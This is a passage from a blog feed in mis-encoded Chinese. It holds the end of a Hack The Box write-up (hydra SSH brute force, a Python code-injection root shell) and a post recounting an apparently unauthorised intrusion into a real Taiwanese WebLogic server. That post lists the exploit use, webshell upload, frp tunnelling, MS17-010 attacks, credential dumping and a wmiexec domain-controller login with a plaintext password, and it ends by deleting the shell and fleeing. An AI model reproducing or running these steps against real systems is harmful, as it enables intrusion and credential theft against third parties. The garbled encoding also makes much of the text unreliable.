= &quot;admin&quot;;$dbpassword = &quot;m19RoAU0hP41A1sTsq6K&quot;;$testuser = &quot;test&quot;;?&gt;</code></pre><hr><pre><code>ç”¨è¿™ä¸ªè´¦å·å¯†ç å°è¯•sshç™»å½•ssh admin@10.10.11.100ç™»å½•ä¸ä¸Šã€‚ã€‚ç”¨åˆšåˆšçš„ä¿å­˜çš„æ–‡ä»¶ç”Ÿæˆä¸€ä¸ªå¯†ç å­—å…¸cut -d : -f 1 passwd &gt;user</code></pre><hr><pre><code>ç”¨ä¹å¤´è›‡çœ‹èƒ½ä¸èƒ½çˆ†ç ´è¿›å»hydra -L user -p m19RoAU0hP41A1sTsq6K 10.10.11.100 ssh</code></pre><h2 id="-7"><a href="#-7" class="headerlink" title=""></a><a href="https://pic.imgdb.cn/item/616d12c72ab3f51d919c2be7"></a></h2><pre><code>çˆ†ç ´å‡ºæ¥äº†ssh development@10.10.11.100  m19RoAU0hP41A1sTsq6Ksshè¿ä¸Šäº†ï¼Œæ™®é€šæƒé™çœ‹wpçš„å°è¯•ææƒ</code></pre><h2 id="-8"><a href="#-8" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d12cc2ab3f51d919c3080.jpg"></h2><pre><code>ec598c30b683202dbda87c5b7b3e108c</code></pre><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><hr><pre><code>sudo -lçœ‹çœ‹æ˜¯å¦æœ‰ä»€ä¹ˆå¯ä»¥æå–æƒé™çš„æ–¹æ³•ï¼Œå¹¶ä¸”æŸ¥çœ‹ä¸€ä¸‹å¯ä»¥ææƒçš„æ–‡ä»¶</code></pre><h2 id="-9"><a href="#-9" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d12d12ab3f51d919c34c0.jpg"></h2><pre><code>ä¸€ä¸ªpyæ–‡ä»¶ï¼Œåº”è¯¥å°±æ˜¯ç”¨å®ƒæ¥ææƒäº†ï¼Œpythonè¿˜æ˜¯æœ‰ç‚¹æ‹‰ï¼Œå¤§æ¦‚èƒ½çœ‹æ‡‚ï¼Œå†™ä¸å‡ºæ¥å†™ä¸€ä¸ª.mdæ–‡ä»¶ï¼Œä¿®æ”¹ä¸€ä¸ªåå¼¹shell</code></pre><h2 id="-10"><a href="#-10" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d12d42ab3f51d919c37c6.jpg"></h2><pre><code># Skytrain Inc   ## Ticket to root  __Ticket Code:__  **102+ 10 == 112 and __import__(&#39;os&#39;).system(&#39;/bin/bash&#39;) == False </code></pre><h2 id="-11"><a href="#-11" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d12db2ab3f51d919c3e73.jpg"></h2><pre><code>1622fdb053418ba4935b17acccc77a12</code></pre><p><img src="https://pic.imgdb.cn/item/616d12e22ab3f51d919c4602.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hack The Box</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è®°ä¸€æ¬¡æ–°æ‰‹çš„å†…ç½‘æ¸—é€</title>
    <link href="/2021/09/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%96%B0%E6%89%8B%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <url>/2021/09/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%96%B0%E6%89%8B%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<pre><code>fofaæ‰¾ç›®æ ‡ï¼šbody=&quot;10.4.5 404 Not Found&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp; region=&quot;TW&quot;ç”¨weblogicæ£€æµ‹å·¥å…·æ£€æµ‹2020-2551æ£€æµ‹åˆ°ä¸€ä¸ª</code></pre><p><img src="https://i.loli.net/2021/10/18/WkLoyqdphtDJ3iR.png"><br><img src="https://i.loli.net/2021/10/18/3EvmtsRpDZPGBQb.png"></p><hr><pre><code>å‘ç°æœ‰æ¼æ´ï¼Œæ¥ä¸‹æ¥è¦ä¸Šä¼ shellçš„è¯éœ€è¦æ‰¾è·¯å¾„å…ˆdirsearchä¸€æ³¢æŒ¨ç€çœ‹ä¸€çœ‹</code></pre><p><img src="https://i.loli.net/2021/10/18/8pAUsiyP9hX3rgw.png"><br><img src="https://i.loli.net/2021/10/18/RTrEFu4gCikmXn5.png"><br><img src="https://i.loli.net/2021/10/18/pdXl7xb1rTYEZhk.png"></p><hr><pre><code>æ‰¾è·¯å¾„ä¸¤ç§åŠæ³•        1.å…¨å±€æœç´¢æ–‡ä»¶        find / -name ModifyRegistry.jsp        2.çœ‹å›¾ç‰‡è·¯å¾„        å³é”®å›¾ç‰‡å¤åˆ¶å›¾ç‰‡è·¯å¾„        http://211.21.93.245:9003/uddiexplorer/oracle_logo.gif        uddiexplorerå¯èƒ½å°±æ˜¯ä»–çš„è·¯å¾„äº†</code></pre><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://i.loli.net/2021/10/18/jThGy8bn1NRZIEp.png"></h2><pre><code>è¯´æ˜ç½‘ç«™çš„è§£æç›®å½•å°±æ˜¯ä»–äº†å…¨å±€æœç´¢å‡ºæ¥æœ‰3ä¸ªä¸æ™“å¾—æ˜¯å“ªä¸ªå‘€ï¼Œè¿™é‡Œå¯ä»¥ä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œä¸Šä¼ äº†å»è®¿é—®ï¼Œä¹Ÿå¯ä»¥æ‰¾é…ç½®æ–‡ä»¶çœ‹ä¸‹ä»–çš„é…ç½®æ–‡ä»¶å‘¢find / -name config.xmlä¾æ¬¡æŸ¥çœ‹æ¯ä¸ªWLS_PORTALä¸å…¶å¯¹åº”ï¼Œåº”è¯¥å°±æ˜¯ä»–äº†ï¼Œå¤åˆ¶è·¯å¾„å†™ä¸ªtxtçœ‹èƒ½ä¸èƒ½è®¿é—®åˆ°ç„¶åä¸Šä¼ ä¸€ä¸ªå†°èçš„jspé©¬weblogicæ˜¯javaå†™çš„ç«¯å£é»˜è®¤æ˜¯7001</code></pre><p><img src="https://i.loli.net/2021/10/18/i5BmrhP2xFHKwsX.png"><br><img src="https://i.loli.net/2021/10/18/g8W2Jq5nUIXSRui.png"></p><hr><pre><code>å†°èè¿æ¥æˆåŠŸäº†ç®€å•ä¿¡æ¯æ”¶é›†ä¸‹uname -a çœ‹ä¸‹å†…æ ¸ç‰ˆæœ¬ï¼Œæ–¹ä¾¿åé¢çš„ææƒarp -a çœ‹ä¸‹arp ç¼“å­˜ping ä¸€ä¸‹dnslogçœ‹dnsèƒ½ä¸èƒ½å‡ºç½‘ï¼Œå‘ç°dnsèƒ½å‡ºï¼Œpingç™¾åº¦å°±æ²¡ååº”ï¼Œç”Ÿæˆçš„httpåè®®çš„elfé©¬æ²¡ååº”å¯èƒ½æ˜¯è¿™ä¸ªåŸå› linuxç³»ç»Ÿï¼Œä¸€èˆ¬ç”¨msfç”Ÿæˆä¸€ä¸ªelfçš„é©¬msfå°±å¯ä»¥ä¸Šçº¿äº†ï¼Œä½†æ˜¯è¯•äº†å‡ æ¬¡ï¼Œä¸çŸ¥é“æ˜¯åè®®è¿˜æ˜¯ä»–ä¸å‡ºç½‘çš„é—®é¢˜è¿æ¥ä¸ä¸Šï¼Œå°±åªæœ‰ç”¨frp+proxifierå†…ç½‘ç©¿é€æŠŠæµé‡ç»™å¸¦åˆ°vpsä¸Šï¼Œæœ¬åœ°è¿æ¥æä»–å†…ç½‘</code></pre><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://i.loli.net/2021/10/18/xCQGlAX2hVsFb1i.png"></h2><pre><code>frpä½¿ç”¨åŠæ³•å‚è€ƒhttps://www.cnblogs.com/hackmang/p/14516969.htmlè¿™é‡Œæ„Ÿè°¢æ¸¸siriçš„æŒ‡å¯¼ã€‚</code></pre><hr><pre><code>proxifierå¯åŠ¨åï¼Œå°±å¯ä»¥è®¿é—®ä»–å†…ç½‘çš„ä¸œè¥¿äº†ï¼Œä¸Šæ°¸æ’ä¹‹è“æ‰«ä»–çš„ç½‘æ®µ(å‰é¢çš„arp -aå‘ç°ä»–æœ‰ä¸¤ä¸ªç½‘æ®µ)192.168.122.0/24     192.168.123.0/24å­˜åœ¨ms17010çš„æœºå™¨æœ‰192.168.122.217192.168.122.29192.168.122.133192.168.123.103192.168.123.209192.168.123.84</code></pre><p><img src="https://i.loli.net/2021/10/18/ECiZ3VbfNRm7Pd5.png"><br><img src="https://i.loli.net/2021/10/18/O2oTz9NXFxHEbhB.png"></p><hr><pre><code>ä¸Šmsfæ‰“expäº†ï¼Œè™šæ‹Ÿæœºå¼€æ¡¥æ¥æ¨¡å¼ç›´æ¥ç”¨ç”µè„‘çš„ç½‘ç»œå‘ç°ms17010æ‰“ä¸äº†ï¼Œä¸Švpsæ‰“å‘ç°ä¹Ÿæ‰“ä¸äº†ï¼Œæœ€åç”¨windwosçš„msfæ‰“ï¼ŒæˆåŠŸäº†ç”¨ms17010çš„å‘½ä»¤æ‰§è¡Œçš„æ¨¡å—ï¼ŒwebæŠ•é€’çœ‹èƒ½ä¸èƒ½ä¸Šçº¿use auxiliary/admin/smb/ms17_010_commandshow optionset commond    æŠŠä¸Šé¢çš„ç”Ÿæˆçš„å¤åˆ¶è¿›å»ï¼Œæ³¨æ„å•åŒå¼•å·è¦åŠ \è½¬ä¹‰set rhosts  å­˜åœ¨æ¼æ´çš„ipexploit  å¼€å§‹æ”»å‡»</code></pre><hr><pre><code>csæˆåŠŸä¸Šçº¿sleep 0æŠ“æ³¢å¯†ç ï¼ŒæŠ“åˆ°äº†ï¼Œæœºå™¨æ²¡æœ‰è£…æ€è½¯ä¿¡æ¯æ”¶é›†ä¸€ä¸‹æŸ¥çœ‹åŸŸç®¡ç†å‘˜   net group &quot;domain admins&quot; /domainæŸ¥çœ‹åŸŸæ§   net group &quot;domain controllers&quot; /domainAD$   DC2012$ä¸¤å°åŸŸæ§æˆ‘ä»¬å·²ç»ä¸Šçº¿äº†ä¸€å°åŸŸæ§äº†ï¼Œæ‰¾ç¬¬äºŒå°åä¸ºADçš„DCnet time /domainping è¿™ä¸ªåŸŸååšDNSè§£æçš„å¤§æ¦‚ç‡å°±æ˜¯å¦ä¸€ä¸ªåŸŸæ§ADäº†æ—¢ç„¶ä»–ä»¬æ˜¯åœ¨åŒä¸€ä¸ªåŸŸï¼Œé‚£ä¹ˆè®¾ç½®çš„ç­–ç•¥éƒ½æ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡åŸŸç®¡ç†å‘˜è´¦å·ç™»å½•192.168.123.219è¿™å°æœºå™¨ï¼Œæ‰€ä»¥ç°åœ¨å’±ä»¬è¦æ•´ä¸€ä¸ªåŸŸç®¡ç†å‘˜çš„è´¦å·å¯†ç å‰é¢æŠ“å¯†ç ä¹ŸæŠ“å‡ºæ¥äº†ï¼Œç›´æ¥ç”¨å¯†ç ç™»å½•ä¸€ä¸‹</code></pre><p><img src="https://i.loli.net/2021/10/18/eG2IJuOF9Xtn4qk.png"><br><img src="https://i.loli.net/2021/10/18/GD2m7KukXCwJUIT.png"><br><img src="https://i.loli.net/2021/10/18/Zcd5kTsjFAS8gmr.png"><br><img src="https://i.loli.net/2021/10/18/sqwUjDaEvQzH9YF.png"></p><hr><pre><code>wmiexec.exe administrator:tyltd2014@192.168.123.219  è¿æ¥æˆåŠŸtasklist /svcçœ‹çœ‹æœ‰æ²¡æœ‰æ€è½¯å­˜åœ¨æ€è½¯ã€‚ã€‚æ²¡æœ‰å…æ€é©¬è¿è¿›å»putä¼ äº†ä¹Ÿæ²¡ç”¨ï¼Œï¼Œ3389å¼€ç€çš„ï¼Œè¿è¿›å»çœ‹çœ‹ï¼Œï¼Œä¸œè¥¿å•¥çš„å°±ä¸åŠ¨äº†ï¼Œåˆ é©¬ï¼Œè·‘è·¯</code></pre><p><img src="https://i.loli.net/2021/10/18/DnFehcyRAks8E1t.png"><br><img src="https://i.loli.net/2021/10/18/1hDTalJSnfZRw5O.png"></p><hr><pre><code>ç”±äºè¿™æ˜¯ç¬¬ä¸€æ¬¡çš„å†…ç½‘æ¸—é€ï¼Œéƒ½æ˜¯å“¥å“¥å¸¦ç€æ‰“çš„ï¼Œåœ¨æ­¤æ„Ÿè°¢é‚£äº›å¸®åŠ©è¿‡æˆ‘çš„å“¥å“¥ï¼Œç¥å¤§å®¶æŒ–0dayè¿™ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡ç”¨markdownï¼Œç¬¬ä¸€æ¬¡å†™åšå®¢ï¼Œæœ‰ä»€ä¹ˆè¾£çœ¼çš„åœ°æ–¹è¿˜è¯·å“¥å“¥ä»¬åˆ«å–·ã€‚</code></pre><p>respect</p>]]></content>
    
    
    
    <tags>
      
      <tag>å†…ç½‘æ¸—é€</tag>
      
      <tag>æ–°æ‰‹</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
